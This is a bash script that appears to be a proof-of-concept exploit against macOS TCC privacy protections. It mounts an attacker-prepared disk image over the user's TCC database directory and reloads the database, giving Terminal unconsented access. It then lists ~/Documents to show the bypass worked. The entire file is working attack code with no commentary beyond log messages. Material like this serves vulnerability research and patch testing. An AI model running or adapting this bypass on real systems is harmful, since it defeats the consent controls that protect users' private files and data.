#!/bin/bash

TCC_DB_IMG=com.apple.TCC.dmg
TCC_DB_LOC="$HOME/Library/Application Support/com.apple.TCC"

RES_MATCHER='/dev/disk([0-9]+)'
# Attach the disk image and get the disk number
if ! [[ `hdiutil attach -nomount $TCC_DB_IMG | tail -n 1` =~ $RES_MATCHER ]]; then
  echo "[ERROR] unexpected attach result"
  exit 1
fi

DISK="/dev/disk${BASH_REMATCH[1]}"
echo "[INFO] attached dmg to disk $DISK"

# Mount disk image at ~/Library/Application Support/com.apple.TCC
DISK_PARTITION=${DISK}s1
mount_apfs $DISK_PARTITION "$TCC_DB_LOC"
echo "[INFO] mounted ${DISK_PARTITION} at $TCC_DB_LOC"

# Reload database so that TCC.db in disk image is used
tccutil reset AddressBook com.apple.Terminal
echo "[INFO] loaded new TCC db"

# List contents of ~/Documents directory
echo "[INFO] access documents directory"
echo -e "<<<< start >>>>\n"
ls -l $HOME/Documents
echo -e "\n<<<< end >>>>"

# Unmount and load original TCC.db
echo "[INFO] cleanup"
hdiutil detach -force $DISK
tccutil reset AddressBook com.apple.Terminal
